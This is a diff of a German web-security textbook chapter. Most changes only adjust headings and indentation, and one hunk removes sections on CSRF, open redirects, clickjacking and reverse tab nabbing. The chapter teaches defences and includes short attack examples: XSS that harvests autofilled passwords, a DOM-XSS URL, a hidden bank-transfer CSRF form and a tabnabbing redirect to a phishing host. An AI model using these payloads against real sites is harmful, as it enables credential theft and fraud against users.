+  Informationen entlockt werden.</p>
 </li>
 <li>
 <p>BeEF bietet auch Angriffe, welche nicht direkt im Social-Engineering
-    verankert sind. Beispiele hierfür wären z.B. Browser-Exploits,
-    Information Gathering, Network Tunneling über Javascript.</p>
+  verankert sind. Beispiele hierfür wären z.B. Browser-Exploits,
+  Information Gathering, Network Tunneling über Javascript.</p>
 </li>
 </ul>
-<h4 id="zusatzliche-angreifersoftware">Zusätzliche Angreifersoftware</h4>
+<h3 id="zusatzliche-angreifersoftware">Zusätzliche Angreifersoftware</h3>
 <p>In den letzten Jahren wurden XSS-Injections auch für
 Bitcoin/Crypto-Mining missbraucht. In diesem Fall wird beim Besuch der
 Webseite ein Crypto-Miner im Browser des Benutzers verankert und zum
@@ -1918,32 +1941,32 @@ Entschädigungsmodel für Webseitenautoren verwendet.</p>
 DDoS-Botnets zu machen. Ein berühmtes Beispiel hierfür ist die LOIC
 (<a href="https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon">Low-Orbit Ion Canon</a>) die z.B. auch gerne von Anonymous verwendet
 wurde.</p>
-<h4 id="stehlen-von-daten-aus-einem-passwortmanager">Stehlen von Daten aus einem Passwortmanager</h4>
+<h3 id="stehlen-von-daten-aus-einem-passwortmanager">Stehlen von Daten aus einem Passwortmanager</h3>
 <p>Die meisten modernen Webbrowser bieten eine Form eines Passwortmanagers
 an. Nach einem durchgeführtem Login werden bei einem erneuten Besuch der
 Seite die Login-Credentials automatisch vom Webbrowser in das Formular
 eingetragen.</p>
 <p>Falls ein Angreifer eine XSS-Lücke innerhalb eines Login-Formulars
 findet, kann er diese ausnutzen um die Login-Daten zu stehlen:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;form&gt;&lt;input id=password type=password style=visibility:hidden&gt;&lt;/form&gt;&#39;</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">setTimeout</span><span class="p">(</span><span class="s1">&#39;alert(&quot;Password: &quot; + document.getElementById(&quot;password&quot;).value)&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
-<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;form&gt;&lt;input id=password type=password style=visibility:hidden&gt;&lt;/form&gt;&#39;</span><span class="p">);</span>
+<span class="nx">setTimeout</span><span class="p">(</span><span class="s1">&#39;alert(&quot;Password: &quot; + document.getElementById(&quot;password&quot;).value)&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
-<h3 id="dom-based-xss-angriffe">DOM-based XSS-Angriffe</h3>
+<h2 id="dom-based-xss-angriffe">DOM-based XSS-Angriffe</h2>
 <p>Bei DOM-based XSS wird das DOM innerhalb des Browsers modifiziert. Da
 der Angriff innerhalb des Browsers geschieht, besitzt der Webserver
 keine Möglichkeit diese Angriffe zu erkennen oder sogar zu verhindern.</p>
 <p>Ein primitives Beispiel für eine über DOM-based XSS verwundbare Webseite
 (<code>seite.html</code>):</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>..<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-            <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="w">                </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;URL: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">baseURI</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;&lt;/b&gt;&quot;</span><span class="p">);</span>
-<span class="w">            </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-        <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>..<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;URL: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">baseURI</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;&lt;/b&gt;&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>Bei dieser Seite wird die aktuelle URL via Javascript ausgelesen (über
 <em>document.baseURI</em>) und dynamisch in die Webseite eingefügt. Wird diese
@@ -1951,8 +1974,7 @@ Seite z.B. als <code>seite.html</code>
 aufgerufen würde <em>URL: seite.html</em> ausgegeben werden. Dies geschieht im
 Browser des Opfers, keine Serveroperation wird dabei involviert.</p>
 <p>Ein Angreifer könnte diese Seite ausnutzen und z.B. über
-<a href="seite.html#&lt;script&gt;alert(1)&lt;/script&gt;"
-class="uri">seite.html#&lt;script&gt;alert(1)&lt;/script&gt;</a>
+<code>seite.html&amp;&lt;script&gt;alert(1)&lt;/script&gt;</code>
 aufrufen. Auf diese Weise wird wieder die URL in das Dokument eingebaut,
 dabei wird allerdings auch der neue Script-Tag (welcher in der URL
 mitübergeben wurde) eingebaut, un dder Browser exekutiert den Inhalt
@@ -1974,7 +1996,7 @@ Angreifers missbraucht werden. Da beigemengte Dokumentation selten als
 möglicher Angriffsvektor erkannt wird (sie führt ja auch keine direkten
 serverseitigen Operationen aus), bleiben diese potentiellen
 Schwachstellen häufig lange unerkannt.</p>
-<h3 id="upload-von-htmljavascript-dateien">Upload von HTML/Javascript-Dateien</h3>
+<h2 id="upload-von-htmljavascript-dateien">Upload von HTML/Javascript-Dateien</h2>
 <p>Falls der Angreifer die Möglichkeit besitzt Dateien hochzuladen, kann
 dieser versuchen, auf diese Weise Javascript-Code in der Applikation zu
 hinterlegen. Hier ist der Angriffsvektor, diese Dateien von einem
@@ -1989,7 +2011,7 @@ die Datei herunter und öffnet anschließend potentiell die lokal
 heruntergeladene Datei — dadurch ist diese nicht mehr Teil der
 Webapplikation und kann daher nicht mehr auf z.B. Session-Cookies
 zugreifen.</p>
-<h4 id="x-content-type-options">X-Content-Type-Options</h4>
+<h3 id="x-content-type-options">X-Content-Type-Options</h3>
 <p>Webserver übermitteln den MIME-Datentypen von übertragenen Dateien über
 den <em>Content-Type</em> Header. Da diese Header “früher” ab und zu falsch
 gesetzt wurden, verwenden einige Browser (primär verschiedene Microsoft
@@ -2010,10 +2032,10 @@ Server übermittelten Content-Type vertraut werden kann.</p>
 <p>Zusätzlich blockieren Browser requests auf JavaScript- bzw. CSS-Dateien
 falls hier nicht der richtige Content-Type gesetzt ist (<em>text/css</em> bzw.
 <em>javascript</em>).</p>
-<h3 id="gegenmanahmen">Gegenmaßnahmen</h3>
+<h2 id="gegenmanahmen">Gegenmaßnahmen</h2>
 <p>Gegenüber XSS-Angriffen werden prinzipiell zwei Gegenmaßnahmen
 empfohlen: Input Sanitation und Escaping von Ausgaben.</p>
-<h4 id="filtern-der-eingaben">Filtern der Eingaben</h4>
+<h3 id="filtern-der-eingaben">Filtern der Eingaben</h3>
 <p>Werden Daten aus nicht-vertrauenswürdigen Quellen verwendet, müssen
 diese automatisiert auf Schadmuster hin überprüft werden. Achtung:
 jegliche Form von Daten, die durch einen Benutzer bereitgestellt werden,
@@ -2031,7 +2053,7 @@ verworfen. Ein Problem bei der Verwendung von WAFs ist deren
 Ressourcen-Verbrauch als auch die potentiell hohe Anzahl von
 False-Positives (Anfragen die zwar nicht bösartig sind, aber von der WAF
 als bösartig erkannt, und daher geblockt werden).</p>
-<h4 id="quoting-wahrend-der-ausgabe">Quoting während der Ausgabe</h4>
+<h3 id="quoting-wahrend-der-ausgabe">Quoting während der Ausgabe</h3>
 <p>Um einen XSS-Angriff erfolgreich durchzuführen, muss der
 Javascript-Schadcode im Webbrowser des Opfers ausgeführt werden. Um dies
 bewerkstelligen zu können, muss eine bösartige Benutzereingabe Teil der
@@ -2049,12 +2071,12 @@ Javascript- als auch HTML-gequotet werden. Eine gute Übersicht über
 diese Problematik gibt das <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md">OWASP XSS Prevention Cheat Sheet</a>. Ein
 einfaches Beispiel hierfür wäre folgendes serverseitige Source Code
 Fragment:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;%= taintedVar %&gt;&#39;</span><span class="p">;</span>
-<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
-<span class="w">    </span><span class="nx">d</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
-<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
-<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;%= taintedVar %&gt;&#39;</span><span class="p">;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">);</span>
+<span class="nx">d</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">d</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
 <p>Die Variable <em>taintedVar</em> wird hier in einen Javascript-String eingefügt
 (Zeile 2), hierbei muss sie gequoted werden, damit Schadcode nicht den
@@ -2068,29 +2090,29 @@ Javascript:</p>
 <ul>
 <li>
 <p>Die Verwendung von Benutzerdaten sollte so weit wie möglich
-    minimiert werden.</p>
+  minimiert werden.</p>
 </li>
 <li>
 <p>User-Supplied Daten sollten niemals auf der linken Seite (LHS) einer
-    Zuweisung verwendet werden.</p>
+  Zuweisung verwendet werden.</p>
 </li>
 <li>
 <p>die Methoden <em>element.write</em> und <em>element.writeln</em> als auch die
-    Attribute <em>innerHTML</em> und <em>outerHTML</em> rendern die übergebenen Texte
-    als HTML-Code. Dabei kann auch Code exekutiert werden — es wird
-    empfohlen stattdessen <em>innerText</em> und <em>textContent</em> zu verwenden.</p>
+  Attribute <em>innerHTML</em> und <em>outerHTML</em> rendern die übergebenen Texte
+  als HTML-Code. Dabei kann auch Code exekutiert werden — es wird
+  empfohlen stattdessen <em>innerText</em> und <em>textContent</em> zu verwenden.</p>
 </li>
 <li>
 <p>die Methode <em>eval</em> sollte vermieden werden. Achtung: teilweise wird
-    eval intern verwendet (z.B. bei Verwendung von Timeout-Funktionen),
-    hier sollten keine Benutzereingaben verwendet werden.</p>
+  eval intern verwendet (z.B. bei Verwendung von Timeout-Funktionen),
+  hier sollten keine Benutzereingaben verwendet werden.</p>
 </li>
 <li>
 <p>Ebenso sollte niemals user-supplied Data als Event-Handler verwendet
-    werden.</p>
+  werden.</p>
 </li>
 </ul>
-<h3 id="hardening-mittels-x-xss-protection">Hardening mittels X-XSS-Protection</h3>
+<h2 id="hardening-mittels-x-xss-protection">Hardening mittels X-XSS-Protection</h2>
 <p>Moderne Browser verwendeten Heuristiken um <em>Reflected-XSS</em> Angriffe
 automatisiert zu erkennen. Zumeist werden hierfür die ausgehenden HTTP
 Requests (inkl. Parameter) mit den eingehenden Antwortdokumenten
@@ -2107,11 +2129,11 @@ Verhalten zu vermeiden.</p>
 </li>
 <li>
 <p><strong>1</strong>: die XSS-Heuristik soll aktiviert werden, erkannte potentielle
-    XSS-Schadmuster werden aus der Ausgabe entfernt.</p>
+  XSS-Schadmuster werden aus der Ausgabe entfernt.</p>
 </li>
 <li>
 <p><strong>1;mode=block</strong>: die XSS-Heuristik soll aktiviert werden, falls
-    XSS-Schadmuster erkannt werden wird keine Webseite gerendert.</p>
+  XSS-Schadmuster erkannt werden wird keine Webseite gerendert.</p>
 </li>
 </ul>
 <p>Während das automatische Filtern von XSS-Schadcode theoretisch positiv
@@ -2120,14 +2142,14 @@ und führte zu folgenden Problemen:</p>
 <ul>
 <li>
 <p>False-Positives: nicht bösartiger Schadcode wurde als Schadcode
-    erkannt und gefiltert. Dadurch wurde die Funktionsfähigkeit korrekt
-    programmierter Webseiten eingeschränkt.</p>
+  erkannt und gefiltert. Dadurch wurde die Funktionsfähigkeit korrekt
+  programmierter Webseiten eingeschränkt.</p>
 </li>
 <li>
 <p>Wird X-XSS-Protection im Default-Modus verwendet, versucht der
-    Browser nur den Schadcode aus dem Antwortdokument zu filtern. Dies
-    kann gezielt durch Angreifer ausgenutzt werden, um auf diese Weise
-    XSS-Code zu generieren[6].</p>
+  Browser nur den Schadcode aus dem Antwortdokument zu filtern. Dies
+  kann gezielt durch Angreifer ausgenutzt werden, um auf diese Weise
+  XSS-Code zu generieren[6].</p>
 </li>
 </ul>
 <p>Aus diesem Grund ignorieren moderne Browser diesen Sicherheitsheader
@@ -2135,7 +2157,7 @@ mittlerweile (Google Chrome, Mozilla Firefox und Microsoft Edge, Stand
 31.12.2019). Als Gegenmaßnahme gegenüber XSS kann daher nur der Einsatz
 von CSP empfohlen werden (abgesehen davon, XSS-Lücken generell nicht zu
 implementieren).</p>
-<h3 id="verwendung-der-content-security-policy">Verwendung der Content-Security-Policy</h3>
+<h2 id="content-security-policy">Content-Security-Policy</h2>
 <p>Die Content Security Policy kann verwendet werden um potentielle
 Javascript-Lücken zu vermeiden. Hierbei wird durch eine Policy definiert
 in welchen Dateien überhaupt Javascript-Code vorkommen darf. Falls eine
@@ -2156,305 +2178,6 @@ normalerweise durch eine Webapplikation blockiert wird) und danach
 mittels eines <em>script</em>-Tags dieses Bild als Javascript-Source File
 innerhalb von HTML inkludieren kann. Dies umgeht potentielle
 CSP-Richtlinien.</p>
-<h2 id="csrf-angriffe">CSRF Angriffe</h2>
-<p>CSRF-Angriffe nutzen ein bestehendes Vertrauensverhältnis zwischen dem
-Web-Browser des Opfers und einem Webserver aus. Das grundsätzliche
-Problem ist, das Webbrowser, bei Requests zu bereits eingeloggten
-Webservern, automatisch Sessions anhängen. Dabei wird nicht überprüft,
-ob der ausgehende Request wirklich vom Benutzer in Auftrag gegeben
-worden ist.</p>
-<p>Folgende Schritte würden bei einem typischen CSRF-Szenario passieren:</p>
-<ol>
-<li>
-<p>Der Benutzer (im Folgenden das Opfer genannt) loggt sich bei einem
-    Webserver ein. Der Webbrowser des Benutzers speichert sich das
-    Session-Cookie für Folgezugriffe auf diesen Webserver.</p>
-</li>
-<li>
-<p>Der Benutzer surft im Internet und besucht dabei einen durch den
-    Angreifer kontrollierten Webserver.</p>
-</li>
-<li>
-<p>Auf diesem Webserver befindet sich ein Formular, welches eine
-    Operation auf dem Webserver, auf dem das Opfer eingeloggt ist,
-    aufruft.</p>
-</li>
-<li>
-<p>Der Browser des Opfers lädt die Webseite vom Webserver des
-    Angreifers. Das Formular wird entweder durch den unbedarften
-    Anwender oder durch Javascript automatisch abgesendet.</p>
-</li>
-<li>
-<p>Der Browser des Opfers hängt automatisch das Session-Cookie zu dem
-    ausgehenden Request hinzu.</p>
-</li>
-<li>
-<p>Der Webserver (auf dem das Opfer eingeloggt war) erhält nun einen
-    Request mit einer validen Session ausgehend vom Webbrowser des
-    Opfers. Da dieser Request vollkommen korrekt aussieht, wird dieser
-    auch exekutiert.</p>
-</li>
-</ol>
-<p>Ein Beispiel für ein HTML Formular welches der Angreifer auf seinem
-Webserver hinterlegen würden:</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://bank.com/transfer.do&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;acct&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;MARIA&quot;</span><span class="p">/&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;amount&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;100000&quot;</span><span class="p">/&gt;</span>
-    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;View my pictures&quot;</span><span class="p">/&gt;</span>
-<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-</code></pre></div>
-<p><img alt="Beispiel für einen CSRF-Angriff" src="/images/csrf.svg" /></p>
-<p>In diesem Fall wird die Operation <code>http://bank.com/transfer.do</code> mit den
-Parametern <em>acct</em> und <em>amount</em> aufgerufen. Bei diesem Beispiel wurden
-die Felder versteckt und der Button mit einem <em>ablenkenden</em> Text
-beschriftet. Alternativ könnte der Angreifer das Formular auch in einem
-1x1 Pixel großem IFrame verstecken und automatisiert mittels Javascript
-abschicken.</p>
-<h3 id="synchronizer-token-pattern">Synchronizer Token Pattern</h3>
-<p>Es gibt mehrere Gegenmaßnahmen gegen CSRF-basierte Angriffe,
-sicherheitstechnisch ist das so genannte <em>Synchronizer Token</em>-Pattern
-vorzuziehen. Bei diesem fügt der Webserver bei jedem Formular ein
-verstecktes HTML-Feld hinzu, in dieses schreibt der Server einen
-zufälligen Zahlenwert. Wird eine Operation am Server aufgerufen wird
-dieses Feld an den Server übertragen und dieser vergleicht den
-übertragenen Zahlenwert mit dem vom Server erwarteten Zahlenwert. Falls
-diese übereinstimmen, wird die Operation ausgeführt, ansonsten wird die
-Operation verworfen. Dieser Schutz funktioniert, da der Angreifer auf
-seinem remote Server den Zahlenwert erraten und in das Angriffs-Formular
-einfügen müsste.</p>
-<p>Damit dieser Schutz verlässlich funktioniert, muss der Zahlenwert
-regelmäßig erneuert werden, bevorzugterweise sollte für jede potentielle
-Operation ein neuer Zufallswert generiert werden. In der Praxis wird
-diese Anti-CSRF Maßnahme häufig vollkommen transparent und automatisch
-durch das verwendete Web-Framework implementiert.</p>
-<p>Wichtig ist, dass eine Operation die einen CSRF-Check implementiert
-nicht nur überprüft, ob ein potentiell übergebener CSRF-Wert mit dem
-server-gespeicherten CSRF-Wert übereinstimmt, sondern auch überprüft ob
-überhaupt ein CSRF-Wert übergeben wurde. Während Tests wurde häufig das
-fehlerhafte Verhalten vorgefunden, dass wenn der CSRF-Parameter einfach
-gelöscht wird, die Operation ausgeführt wird (also CSRF-Tokens nur
-verglichen werden, wenn beim Aufruf zumindest ein CSRF-Wert übergeben
-wird).</p>
-<h3 id="samesite-flag-bei-session-cookies">SameSite-Flag bei Session Cookies</h3>
-<p>Eine weitere Schutzmaßnahme (im Sinne des Hardening) ist der Einsatz des
-<em>SameSite</em> Cookie-Flags (siehe auch Kapitel
-<a href="#session_cookies_samesite" data-reference-type="ref"
-data-reference="session_cookies_samesite">[session_cookies_samesite]</a>,
-Seite ). Bei korrektem Setzen dieses Flags erlaubt der Web-Browser des
-Opfers das Übertragen der Session-Id nur, wenn sowohl das Formular als
-auch das Ziel des Formulars sich auf dem identen Webserver befinden.</p>
-<h2 id="unverified-forwards-and-redirects">Unverified Forwards and Redirects</h2>
-<p>Diese Schwachstelle war in den OWASP Top 10 2013 vorhanden, wurde
-allerdings 2017 aus der Liste der Top 10 entfernt. Die Schwachstelle
-entsteht, falls eine Operation einer Webapplikation den Benutzerbrowser
-auf eine weitere Seite weiterleitet und das Ziel über einen Parameter
-bestimmt wird. Ein Angreifer kann nun versuchen, das Opfer auf eine
-externe Seite zu leiten um dies im Zuge eines Social Engineering
-Angriffs auszunutzen. Eine verwundbare Operation würde z.B.
-folgendermaßen aussehen: <code>http://example.com/example.php?url=http://malicious.example.com</code>.</p>
-<p>Besonders gefährlich ist es, wenn die verlinkte URL nicht über ein HTTP
-Redirect aufgerufen wird, sondern wenn die übergebene URL als Ziel eines
-eingebetteten IFrames verwendet wird. Auf diese Weise kann der Angreifer
-Inhalte auf der (vermeintlichen) Opferwebseite platzieren, die meisten
-Enduser werden nicht bemerken, dass sie gerade Daten in einem Iframe und
-nicht in der Opfer-Webseite eingeben.</p>
-<p>Falls es wirklich notwendig sein sollte, dass eine Zieladresse über
-einen URL-Parameter übergeben wird, sollte penibles Whitelisting der
-erlaubten URLs betrieben werden.</p>
-<h2 id="clickjacking">Clickjacking</h2>
-<p>Clickjacking wird auch teilweise <em>UI redress attack</em> genannt. Bei diesem
-Angriff will der Angreifer einen unbedarften Benutzer dazu bringen, eine
-Webseite zu bedienen. Um dies durchzuführen, baut der Angreifer eine
-eigene, harmlos aussehende, Webseite, welche den identen Bedienfluss wie
-die Webseite besitzt, die der Angreifer gerne fernsteuern würde. Mittels
-eines IFrames wird die Opferwebseite über die erstellte Webseite des
-Angreifers gelegt, die Transparenz der Opfer-Webseite wird auf 100%
-gesetzt.</p>
-<p>Wenn nun der Benutzer die vermeintliche (vom Angreifer erstellte)
-Webseite bedient, werden in Wirklichkeit alle Benutzereingaben an die
-transparente Opfer-Webseite übertragen und dadurch diese durch den
-Benutzer ferngesteuert.</p>
-<p>Eine gute Abwehrmassnahme gegen Clickjacking ist der <em>X-Frame-Options</em>
-HTTP Header.</p>
-<h3 id="x-frame-options">X-Frame-Options</h3>
-<p>Der <em>X-Frame-Options</em> Header wird verwendet um dem Webbrowser
-mitzuteilen, innerhalb welcher Webseiten die eigene Webseite eingebunden
-werden darf. Dadurch werden Clickjacking-Angriffe unterbunden.</p>
-<p>Der Webserver kann über das Setzen des <em>X-Frame-Options</em> Header auf
-folgende Werte das Webbrowser-Verhaltensmuster beeinflussen:</p>
-<p>DENY: die Webseite darf nicht von anderen Webseiten mittels IFrames
-eingebunden werden.</p>
-<p>SAMEORIGIN: die Webseite darf von allen Webseiten mit dem identen Origin
-eingebunden werden.</p>
-<p>ALLOW-FROM domain: die Webseite darf explizit von der Domain <em>domain</em> eingebunden werden.</p>
-<p>Die Verwendung von <em>X-Frame-Options</em> ist allerdings nicht problemlos.
-EIn häufiger Fehler ist es, dass bei <em>ALLOW-FROM</em> mehr als ein Origin
-angegeben wird. Dies kann z.B. geschehen, falls der Entwickler das
-Inkludieren ausgehend von zwei externen Seiten, oder das Inkludieren
-ausgehend von der eigenen und von einer externen Seite erwünscht. Dies
-ist mittles <em>X-Frame-Options</em> nicht abbildbar, wird dieses Verhalten
-gewünscht, muss eine Content-Security Policy angewendet werden.</p>
-<p>Ein weiteres Problem ist <em>Double Framing</em>. Eine Webseite versucht durch
-Einsatz von <em>SAMEORIGIN</em> das Einbinden durch eine externe Seite zu
-unterbinden. Der <em>X-Frame-Options</em> Header bezieht sich allerdings immer
-auf das ,,äußerste” IFrame. Wird z.B. auf der eigenen Seite ein IFrame
-mit einer externen Seite inkludiert, und diese externe Seite inkludiert
-selbst über ein IFrame die eigene Seite, wird diese angezeigt auch wenn
-dies durch den gesetzten Header als unterbunden gedacht wurde. Auch dies
-ist nicht einfach über <em>X-Frame-Options</em> abbildbar.</p>
-<h2 id="reverse-tab-nabbing">Reverse Tab Nabbing</h2>
-<p>Bei einem Reverse Tab Nabbing navigiert der Benutzer zuerst auf eine
-Opferseite. Diese öffnet nun einen Link auf eine bösartige Seite in
-einem neuen Fenster. Die aufgerufene bösartige Seite verwendet nun
-Javascript um die Adresse der aufrufenden Seite (die wahrscheinlich
-gerade im Hintergrund ist) zu verändern, der Webbrowser führt nun ein
-redirect auf die neu verlinkte Seite im Hintergrund vor (während der
-Benutzer noch immer die neu geöffnete Seite betrachtet). Wenn der
-Benutzer nun das geöffnete Fenster schließt befindet er sich
-vermeintlich auf der ursprünglichen Seite, welche den Link öffnete,
-befindet sich allerdings in Wirklichkeit auf einer Seite, die vom
-Angreifer bestimmt wurde.</p>
-<p>Ein Beispiel für Reverse Tab Nabbing, folgende Opfer Seite:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;bad.example.com&quot;</span> <span class="na">target</span><span class="o">=</span><span class="s">&quot;_blank&quot;</span><span class="p">&gt;</span>Vulnerable target using html link to open the new page<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;window.open(&#39;https://bad.example.com&#39;)&quot;</span><span class="p">&gt;</span>Vulnerable target using javascript to open the new page<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
-      <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</code></pre></div>
-<p>Die Opferwebseite öffnet eine externe Seite über einen Link (mittels
-<em>target=_blank</em> wird ein neues Fenster geöffnet) bzw. alternativ über
-Javascript (<em>onclick</em>). Als neue Webseite verwendet der Angreifer
-folgendes:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://phish.example.com&quot;</span><span class="p">;</span>
-<span class="w">          </span><span class="p">}</span>
-<span class="w">        </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-      <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</code></pre></div>
-<p>Der Angreifer setzt über <em>window.opener</em> die Adresse der aufgerufenen
-Seite und ändert dadurch (im Hintergrund) die im Webbrowser dargestellte
-Seite. Wenn der Benutzer die geöffnete Seite schließt, gelangt er
-dadurch auf eine vom Angreifer modifizierte Webseite.</p>
-<p>Als Gegenmaßnahme sollte bei ausgehenden Links immer das <em>rel</em> Attribute
-auf <em>noopener noreferrer</em> gesetzt werden. Dadurch kann die geöffnete
-Seite nicht mehr über <em>windows.opener</em> auf die Location der öffnenden
-Seite zugreifen. Zusätzlich kann über die <em>Referrer-Policy</em> das
-Übermitteln des Referrer-Headers an die aufgerufene Webseite unterbunden
-werden.</p>
-<p><strong>Update 2020</strong>: mehrere Browser bieten mittlerweile automatische
-Verteidigungsmassnahmen gegenüber Reverse Tabnabbing Angriffe. Firefox
-(seit 2016), Microsoft Edge und Firefox sollten out-of-the-box nicht
-mehr gegenüber diesem Angriff verwundbar sein (sie setzen das
-<em>noopener</em>-Flag automatisch). In zukünftigen Google Chrome Versionen ab
-2021 sollte diese Browserfamilie dies auch durchführen und auf diese
-Weise Tabnabbing-Angriffe unterbinden.</p>
-<h2 id="html5-postmessage-als-angriffskanal">HTML5 PostMessage als Angriffskanal</h2>
